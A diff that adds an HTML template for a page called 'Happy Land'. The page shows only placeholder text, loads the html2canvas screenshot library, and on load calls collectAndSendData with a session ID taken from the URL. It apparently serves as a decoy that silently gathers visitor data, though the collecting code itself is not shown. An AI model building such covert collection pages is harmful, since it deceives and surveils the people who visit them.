@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Land</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const sessionId = getQueryParam('session_id');
+            if (sessionId) {
+                collectAndSendData(sessionId);
+            } else {
+                console.error('No session_id found in URL');
+            }
+        });
+    </script>
+</head>
+<body>
+    <div class="content">
+        <h1>Welcome to Happy Land</h1>
+        <p>Loading amazing content...</p>
+    </div>
+</body>
+</html>
